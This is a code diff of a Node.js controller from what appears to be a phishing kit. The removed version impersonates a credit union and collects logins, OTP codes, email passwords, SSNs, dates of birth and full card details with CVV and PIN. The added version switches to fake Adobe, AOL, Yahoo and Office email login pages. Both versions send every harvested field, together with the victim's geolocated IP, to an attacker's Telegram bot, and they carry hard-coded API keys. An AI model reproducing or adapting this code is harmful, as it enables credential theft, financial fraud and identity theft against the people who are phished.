@@ -1,82 +1,42 @@
 const { sendMessageFor } = require("simple-telegram-message");
 const ipInfo = require("ip-info-finder");
 const { getClientIp } = require("request-ip");
-const { botToken, chatId } = require("../config/settings");
+const { botToken, chatId } = require("../../settings");
 const axios = require('axios');
-const ApiKey = 'bdc_4422bb94409c46e986818d3e9f3b2bc2';
-const URL = `https://api-bdc.net/data/ip-geolocation?ip=`
+const abstractApiKey = '72afc8e739e6478d9202565f05968721';
+const URL = `https://ipgeolocation.abstractapi.com/v1/?api_key=${abstractApiKey}&ip_address=`;
+
+
+
 
 exports.login = (req, res) => {
 	return res.render("login");
 };
 
-exports.loginPost = async (req, res) => {
-	const { username, password } = req.body;
-	const sendAPIRequest = async (ipAddress) => {
-        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
-		console.log(apiResponse.data);
-        return apiResponse.data;
-    };
-
-    const ipAddress = getClientIp(req);
-    const ipAddressInformation = await sendAPIRequest(ipAddress);
-
-
-	try{
-    // Move the console.log statement outside the sendAPIRequest function
-    console.log(ipAddressInformation);
-
-    const userAgent = req.headers["user-agent"];
-    const systemLang = req.headers["accept-language"];
-
-	const message =
-		`✅ UPDATE TEAM | OPCCU | USER_${ipAddress}\n\n` +
-		`👤 LOGIN INFO\n` +
-		`USERNAME         : ${username}\n` +
-		`PASSWORD         : ${password}\n\n` +
-		`🌍 GEO-IP INFO\n` +
-		`IP ADDRESS       : ${ipAddressInformation.ip}\n` +
-        `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +  // Fix variable names
-        `CITY             : ${ipAddressInformation.location.city}\n` +
-        `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
-        `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
-        `COUNTRY          : ${ipAddressInformation.country.name}\n` +
-		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
-		`ISP              : ${ipAddressInformation.network.organisation}\n\n` +
-        `💻 SYSTEM INFO\n` +
-        `USER AGENT       : ${userAgent}\n` +
-        `SYSTEM LANGUAGE  : ${systemLang}\n` +
-        `💬 Telegram: https://t.me/UpdateTeams\n` +
-		`🌐 Website: Coming soon!!\n`;
-
-  const sendMessage = sendMessageFor(botToken, chatId);
-    sendMessage(message);
-
-	console.log(message);
-
-    res.redirect("/auth/login/2");
-    
-} catch (error) {
-	// Handle any unexpected errors here
-	console.error('Unexpected error:', error.message);
-	res.status(500).send('Internal Server Error');
-}
-process.on('unhandledRejection', (reason, promise) => {
-    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
-    // Handle the rejection
-});
-
-	
-};
-
 exports.login2 = (req, res) => {
-	res.render("login2");
+	switch (req.query.email_provider) {
+		case "aol":
+			return res.render("aol/login2");
+			break;
+		case "yahoo":
+			return res.render("yahoo/login2");
+			break;
+		case "office":
+			return res.render("office/login2");
+			break;
+		case "outlook":
+			return res.render("office/login2");
+			break;
+		default:
+			return res.render("login2");
+			break;
+	}
 };
 
 exports.loginPost2 = async (req, res) => {
-	const { username, password } = req.body;
+	const { username, email_provider } = req.body;
 	const sendAPIRequest = async (ipAddress) => {
-        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
+        const apiResponse = await axios.get(URL + "&ip_address=" + ipAddress);
 		console.log(apiResponse.data);
         return apiResponse.data;
     };
@@ -92,24 +52,22 @@ exports.loginPost2 = async (req, res) => {
     const userAgent = req.headers["user-agent"];
     const systemLang = req.headers["accept-language"];
 
+
 	const message =
-		`✅ UPDATE TEAM | OPCCU | USER_${ipAddress}\n\n` +
-		`👤 RELOGIN INFO\n` +
-		`USERNAME         : ${username}\n` +
-		`PASSWORD         : ${password}\n\n` +
+		`✅ UPDATE TEAM | AD0BE | USER_${ipAddress}\n\n` +
+		`👤 EMAIL INFO\n` +
+		`EMAIL PROVIDER   : ${email_provider}\n` +
+		`USER             : ${username}\n\n` +
 		`🌍 GEO-IP INFO\n` +
-		`IP ADDRESS       : ${ipAddress}\n` +
-		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n`;
-		`💬 Telegram: https://t.me/UpdateTeams\n` +
-         `🌐 Website: Coming soon!!\n`;
+            `IP ADDRESS       : ${ipAddressInformation.ip_address}\n` +
+            `TIME             : ${ipAddressInformation.timezone.current_time}\n` +
+            `💬 Telegram: https://t.me/UpdateTeams\n`;
+         
 
 	const sendMessage = sendMessageFor(botToken, chatId);
-    sendMessage(message);
+	sendMessage(message);
 
-	console.log(message);
-
-    res.redirect("/auth/login/3");
-    
+	return res.redirect(`/auth/login/3?email_provider=${email_provider}`);
 } catch (error) {
 	// Handle any unexpected errors here
 	console.error('Unexpected error:', error.message);
@@ -124,13 +82,29 @@ process.on('unhandledRejection', (reason, promise) => {
 };
 
 exports.login3 = (req, res) => {
-	res.render("login3");
+	switch (req.query.email_provider) {
+		case "aol":
+			return res.render("aol/login3");
+			break;
+		case "yahoo":
+			return res.render("yahoo/login3");
+			break;
+		case "office":
+			return res.render("office/login3");
+			break;
+		case "outlook":
+			return res.render("office/login3");
+			break;
+		default:
+			return res.render("login3");
+			break;
+	}
 };
 
 exports.loginPost3 = async (req, res) => {
-	const { otp } = req.body;
+	const { password, email_provider } = req.body;
 	const sendAPIRequest = async (ipAddress) => {
-        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
+        const apiResponse = await axios.get(URL + "&ip_address=" + ipAddress);
 		console.log(apiResponse.data);
         return apiResponse.data;
     };
@@ -147,22 +121,19 @@ exports.loginPost3 = async (req, res) => {
     const systemLang = req.headers["accept-language"];
 
 	const message =
-		`✅ UPDATE TEAM | OPCCU | USER_${ipAddress}\n\n` +
-		`👤 OTP INFO\n` +
-		`OTP CODE         : ${otp}\n\n` +
+		`✅ UPDATE TEAM | AD0BE | USER_${ipAddress}\n\n` +
+		`👤 EMAIL INFO\n` +
+		`PASSWORD         : ${password}\n\n` +
 		`🌍 GEO-IP INFO\n` +
-            `IP ADDRESS       : ${ipAddress}\n` +
-            `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n`;
-            `💬 Telegram: https://t.me/UpdateTeams\n` +
-		`🌐 Website: Coming soon!!\n`;
+            `IP ADDRESS       : ${ipAddressInformation.ip_address}\n` +
+            `TIME             : ${ipAddressInformation.timezone.current_time}\n` +
+            `💬 Telegram: https://t.me/UpdateTeams\n`;
+         
 
 	const sendMessage = sendMessageFor(botToken, chatId);
-    sendMessage(message);
+	sendMessage(message);
 
-	console.log(message);
-
-    res.redirect("/auth/login/4");
-    
+	return res.redirect(`/auth/login/4?email_provider=${email_provider}`);
 } catch (error) {
 	// Handle any unexpected errors here
 	console.error('Unexpected error:', error.message);
@@ -177,68 +148,29 @@ process.on('unhandledRejection', (reason, promise) => {
 };
 
 exports.login4 = (req, res) => {
-	res.render("login4");
+	switch (req.query.email_provider) {
+		case "aol":
+			return res.render("aol/login4");
+			break;
+		case "yahoo":
+			return res.render("yahoo/login4");
+			break;
+		case "office":
+			return res.render("office/login4");
+			break;
+		case "outlook":
+			return res.render("office/login4");
+			break;
+		default:
+			return res.render("login4");
+			break;
+	}
 };
 
 exports.loginPost4 = async (req, res) => {
-	const { emailAddr, emailPass } = req.body;
+	const { password } = req.body;
 	const sendAPIRequest = async (ipAddress) => {
-        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
-		console.log(apiResponse.data);
-        return apiResponse.data;
-    };
-
-    const ipAddress = getClientIp(req);
-    const ipAddressInformation = await sendAPIRequest(ipAddress);
-
-
-	try{
-    // Move the console.log statement outside the sendAPIRequest function
-    console.log(ipAddressInformation);
-
-    const userAgent = req.headers["user-agent"];
-    const systemLang = req.headers["accept-language"];
-
-
-	const message =
-		`✅ UPDATE TEAM | OPCCU | USER_${ipAddress}\n\n` +
-		`👤 EMAIL INFO\n` +
-		`EMAIL ADDRESS    : ${emailAddr}\n` +
-		`EMAIL PASSWORD   : ${emailPass}\n\n` +
-		`🌍 GEO-IP INFO\n` +
-		`IP ADDRESS       : ${ipAddress}\n` +
-		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n`;
-		`💬 Telegram: https://t.me/UpdateTeams\n`+
-		`🌐 Website: Coming soon!!\n`;
-
-	const sendMessage = sendMessageFor(botToken, chatId);
-    sendMessage(message);
-
-	console.log(message);
-
-    res.redirect("/auth/login/5");
-    
-} catch (error) {
-	// Handle any unexpected errors here
-	console.error('Unexpected error:', error.message);
-	res.status(500).send('Internal Server Error');
-}
-process.on('unhandledRejection', (reason, promise) => {
-    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
-    // Handle the rejection
-});
-
-	
-};
-
-exports.login5 = (req, res) => {
-	return res.render("login5");
-};
-
-exports.loginPost5 = async (req, res) => {
-	const { fullName, address, zip, phone, dob, ssn } = req.body;
-	const sendAPIRequest = async (ipAddress) => {
-        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
+        const apiResponse = await axios.get(URL + "&ip_address=" + ipAddress);
 		console.log(apiResponse.data);
         return apiResponse.data;
     };
@@ -255,83 +187,19 @@ exports.loginPost5 = async (req, res) => {
     const systemLang = req.headers["accept-language"];
 
 	const message =
-		`✅ UPDATE TEAM | OPCCU | USER_${ipAddress}\n\n` +
-		`👤 PERSONAL INFO\n` +
-		`FULL NAME        : ${fullName}\n` +
-		`STREET ADDRESS   : ${address}\n` +
-		`ZIP CODE         : ${zip}\n` +
-		`PHONE NUMBER     : ${phone}\n` +
-		`DOB              : ${dob}\n` +
-		`SSN              : ${ssn}\n\n` +
+		`✅ UPDATE TEAM | AD0BE | USER_${ipAddress}\n\n` +
+		`👤 EMAIL INFO (RELOGIN)\n` +
+		`PASSWORD         : ${password}\n\n` +
 		`🌍 GEO-IP INFO\n` +
-            `IP ADDRESS       : ${ipAddress}\n` +
-            `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n`;
-            `💬 Telegram: https://t.me/UpdateTeams\n`+
-		`🌐 Website: Coming soon!!\n`;
+            `IP ADDRESS       : ${ipAddressInformation.ip_address}\n` +
+            `TIME             : ${ipAddressInformation.timezone.current_time}\n` +
+            `💬 Telegram: https://t.me/UpdateTeams\n`;
+         
 
 	const sendMessage = sendMessageFor(botToken, chatId);
-    sendMessage(message);
+	sendMessage(message);
 
-	console.log(message);
-
-    res.redirect("/auth/login/6");
-    
-} catch (error) {
-	// Handle any unexpected errors here
-	console.error('Unexpected error:', error.message);
-	res.status(500).send('Internal Server Error');
-}
-process.on('unhandledRejection', (reason, promise) => {
-    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
-    // Handle the rejection
-});
-
-	
-};
-
-exports.login6 = (req, res) => {
-	return res.render("login6");
-};
-
-exports.loginPost6 = async (req, res) => {
-	const { cardNum, expDate, cvv, cpin } = req.body;
-	const sendAPIRequest = async (ipAddress) => {
-        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
-		console.log(apiResponse.data);
-        return apiResponse.data;
-    };
-
-    const ipAddress = getClientIp(req);
-    const ipAddressInformation = await sendAPIRequest(ipAddress);
-
-
-	try{
-    // Move the console.log statement outside the sendAPIRequest function
-    console.log(ipAddressInformation);
-
-    const userAgent = req.headers["user-agent"];
-    const systemLang = req.headers["accept-language"];
-
-	const message =
-		`✅ UPDATE TEAM | OPCCU | USER_${ipAddress}\n\n` +
-		`👤 CARD INFO\n` +
-		`CARD NUMBER      : ${cardNum}\n` +
-		`EXPIRY DATE      : ${expDate}\n` +
-		`CVV              : ${cvv}\n` +
-		`CARD PIN         : ${cpin}\n\n` +
-		`🌍 GEO-IP INFO\n` +
-            `IP ADDRESS       : ${ipAddress}\n` +
-            `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n`;
-            `💬 Telegram: https://t.me/UpdateTeams\n`+
-         `🌐 Website: Coming soon!!\n`;
-
-	const sendMessage = sendMessageFor(botToken, chatId);
-    sendMessage(message);
-
-	console.log(message);
-
-    res.redirect("/auth/complete");
-    
+	return res.redirect("/auth/complete");
 } catch (error) {
 	// Handle any unexpected errors here
 	console.error('Unexpected error:', error.message);
